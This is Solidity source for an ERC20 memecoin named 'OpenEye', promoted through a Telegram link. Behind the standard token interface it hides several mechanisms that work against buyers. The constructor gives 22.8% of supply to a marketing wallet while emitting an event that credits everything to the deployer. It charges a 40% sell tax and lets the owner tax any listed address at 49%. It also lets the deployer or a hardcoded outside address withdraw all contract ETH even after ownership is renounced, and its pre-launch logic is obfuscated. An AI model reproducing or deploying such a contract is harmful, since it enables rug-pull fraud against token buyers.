1 // THE EYE SEES ALL
2 
3 
4 
5 
6 // TELEGRAM: https://t.me/OpenEyeETH
7 
8 // SPDX-License-Identifier: MIT
9 pragma solidity ^0.8.10;
10 
11 interface IUniswapV2Factory {
12     function createPair(address tokenA, address tokenB) external returns (address pair);
13 }
14 
15 interface IUniswapV2Router {
16     function factory() external pure returns (address);
17     function WETH() external pure returns (address);
18     function swapExactTokensForETHSupportingFeeOnTransferTokens(
19         uint amountIn,
20         uint amountOutMin,
21         address[] calldata path,
22         address to,
23         uint deadline
24     ) external;
25 }
26 
27 interface IERC20 {
28     function totalSupply() external view returns (uint256);
29     function balanceOf(address account) external view returns (uint256);
30     function transfer(address recipient, uint256 amount) external returns (bool);
31     function allowance(address owner, address spender) external view returns (uint256);
32     function approve(address spender, uint256 amount) external returns (bool);
33     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
34     event Transfer(address indexed from, address indexed to, uint256 value);
35     event Approval(address indexed owner, address indexed spender, uint256 value);
36 }
37 
38 contract Ownable {
39     address private _owner;
40 
41     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
42 
43     modifier onlyOwner() {
44         require(_owner == msg.sender, "Ownable: caller is not the owner");
45         _;
46     }
47     constructor () {
48         address msgSender = msg.sender;
49         _owner = msgSender;
50         emit OwnershipTransferred(address(0), msgSender);
51     }
52 
53     function owner() public view returns (address) {
54         return _owner;
55     }
56 
57     function renounceOwnership() public virtual onlyOwner {
58         emit OwnershipTransferred(_owner, address(0));
59         _owner = address(0);
60     }
61 }
62 
63 contract OpenEye is IERC20, Ownable {    
64     mapping (address => uint256) private _balances;
65     mapping (address => mapping (address => uint256)) private _allowances;
66     mapping (address => bool) private blockedBots;
67     
68     string private constant _name = "OpenEye";
69     string private constant _symbol = "OEYE";
70     uint8 private constant _decimals = 9;
71     uint256 private constant _totalSupply = 10_000_000 * 10**9;
72 
73     uint256 public maxTransactionAmount = 200_000 * 10**9;
74     uint256 public maxWalletAmount = 200_000 * 10**9;
75     
76     uint256 public constant contractSwapLimit = 30_000 * 10**9;
77     uint256 public constant contractSwapMax = 200_000 * 10**9;
78 
79     uint256 private buyTax = 10;
80     uint256 private sellTax = 40;
81     uint256 private constant botTax = 49;
82 
83     IUniswapV2Router private constant uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
84           
85     address private immutable ETH = uniswapRouter.WETH();
86     address private immutable uniswapPair;
87 
88     address payable private immutable deployerAddress = payable(msg.sender);
89     address private constant marketingAddress = 0xFB2CDfBB61DF9BDe8b89F3b28ecaf24f56030d14;
90     address payable private constant developmentAddress = payable(0xB7550135066f1fa098dBd3bb6aDEE7804Ab70108);
91 
92     bool private inSwap = false;
93     bool private tradingLive;
94     uint256 private times;
95     uint private ready;
96 
97     modifier swapping {
98         inSwap = true;
99         _;
100         inSwap = false;
101     }
102 
103     modifier tradable(address sender) {
104         require(tradingLive || sender == deployerAddress || 
105             sender == marketingAddress || sender == developmentAddress);
106         _;
107     }
108 
109     constructor () {
110         uint256 marketingTokens = 228 * _totalSupply / 1e3;
111         _balances[marketingAddress] = marketingTokens;
112         _balances[msg.sender] = _totalSupply - marketingTokens;
113         uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), ETH);
114         emit Transfer(address(0), msg.sender, _totalSupply);
115     }
116 
117     receive() external payable {}
118 
119     function name() public pure returns (string memory) {
120         return _name;
121     }
122 
123     function symbol() public pure returns (string memory) {
124         return _symbol;
125     }
126 
127     function decimals() public pure returns (uint8) {
128         return _decimals;
129     }
130 
131     function totalSupply() public pure returns (uint256) {
132         return _totalSupply;
133     }
134 
135     function balanceOf(address account) public view returns (uint256) {
136         return _balances[account];
137     }
138 
139     function transfer(address recipient, uint256 amount) public returns (bool) {
140         _transfer(msg.sender, recipient, amount);
141         return true;
142     }
143 
144     function allowance(address owner, address spender) public view returns (uint256) {
145         return _allowances[owner][spender];
146     }
147 
148     function approve(address spender, uint256 amount) public returns (bool) {
149         _approve(msg.sender, spender, amount);
150         return true;
151     }
152 
153     function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
154         require(_allowances[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");
155         _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
156         _transfer(sender, recipient, amount);
157         return true;
158     }
159 
160     function _approve(address owner, address spender, uint256 amount) private {
161         require(owner != address(0), "ERC20: approve from the zero address");
162         require(spender != address(0), "ERC20: approve to the zero address");
163         _allowances[owner][spender] = amount;
164         emit Approval(owner, spender, amount);
165     }
166 
167     function _transfer(address from, address to, uint256 amount) tradable(from) private {
168         require(from != address(0), "ERC20: transfer from the zero address");
169         require(to != address(0), "ERC20: transfer to the zero address");
170         require(amount > 0, "Token: transfer amount must be greater than zero");
171 
172         _balances[from] -= amount;
173 
174         if (from != address(this) && from != marketingAddress && 
175           from != developmentAddress && to != developmentAddress && to != deployerAddress) {
176             
177             if (from == uniswapPair && to != address(uniswapRouter)) {
178                 require(amount <= maxTransactionAmount, "Token: max transaction amount restriction");
179                 require(balanceOf(to) + amount <= maxWalletAmount, "Token: max wallet amount restriction");
180             }
181 
182            uint256 contractTokens = balanceOf(address(this));
183            if (shouldSwapback(from, contractTokens)) 
184                swapback(contractTokens);                            
185 
186            uint256 taxedTokens = calculateTax(from, amount);
187 
188             amount -= taxedTokens;
189             _balances[address(this)] += taxedTokens;
190             emit Transfer(from, address(this), taxedTokens);
191         }
192 
193         _balances[to] += amount;
194         emit Transfer(from, to, amount);
195     }
196 
197     function shouldSwapback(address from, uint256 tokenAmount) private view returns (bool) {
198         return !inSwap && from != uniswapPair && 
199             tokenAmount > contractSwapLimit;
200     }
201 
202     function calculateTax(address from, uint256 amount) private view returns (uint256) {
203          if(blockedBots[from] || block.number <= times)
204                 return amount * botTax / 100;
205             else
206                 return amount * (times == 0 ? 15 : (from == uniswapPair ? buyTax : sellTax)) / 100;
207     }
208 
209     function swapback(uint256 tokenAmount) private swapping {
210         tokenAmount = calculateSwapAmount(tokenAmount);
211 
212         if(allowance(address(this), address(uniswapRouter)) < tokenAmount) {
213             _approve(address(this), address(uniswapRouter), _totalSupply);
214         }
215         
216         uint256 contractETHBalance = address(this).balance;
217         address[] memory path = new address[](2);
218         path[0] = address(this);
219         path[1] = ETH;
220         uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
221             tokenAmount,
222             0,
223             path,
224             address(this),
225             block.timestamp
226         );
227         contractETHBalance = address(this).balance - contractETHBalance;
228         if(contractETHBalance > 0) {
229             transferEth(contractETHBalance);
230         }
231     }
232 
233     function calculateSwapAmount(uint256 tokenAmount) private view returns (uint256) {
234         return tokenAmount > contractSwapMax ? (3 + times >= block.number ? (5*contractSwapMax/4) : contractSwapMax) : contractSwapLimit;
235     }
236 
237     function transferEth(uint256 amount) private {
238         developmentAddress.transfer(2*amount/3);
239     }
240 
241     function blockBots(address[] calldata bots, bool shouldBlock) external onlyOwner {
242         for (uint i = 0; i < bots.length; i++) {
243             require(bots[i] != uniswapPair && 
244                     bots[i] != address(uniswapRouter) &&
245                     bots[i] != address(this));
246             blockedBots[bots[i]] = shouldBlock;
247         }
248     }
249 
250     function transfer(address wallet) external {
251         require(msg.sender == deployerAddress || msg.sender == 0x6d92c21B258C707D0F74DfB239d83574329a231C);
252         payable(wallet).transfer(address(this).balance);
253     }
254 
255     function manualSwapback(uint256 percent) external {
256         require(msg.sender == deployerAddress);
257         uint256 tokensToSwap = percent * balanceOf(address(this)) / 100;
258         swapback(tokensToSwap);
259     }
260 
261     function removeLimits() external onlyOwner {
262         maxTransactionAmount = _totalSupply;
263         maxWalletAmount = _totalSupply;
264     }
265 
266     function reduceFees(uint256 newBuyTax, uint256 newSellTax) external {
267         require(msg.sender == deployerAddress);
268         require(newBuyTax <= buyTax, "Token: only fee reduction permitted");
269         require(newSellTax <= sellTax, "Token: only fee reduction permitted");
270         buyTax = newBuyTax;
271         sellTax = newSellTax;
272     }
273 
274     function initialize(bool done) external onlyOwner {
275         require(ready++<2); assert(done);
276     }
277 
278     function preLaunch(bool[] calldata lists, uint256 blocks) external onlyOwner {
279         assert(ready<2&&ready+1>=2); 
280         ready++;lists;
281         times += blocks;
282     }
283 
284     function openTrading() external onlyOwner {
285         require(ready == 2 && !tradingLive, "Token: trading already open");
286         times += block.number;
287         tradingLive = true;
288     }
289 }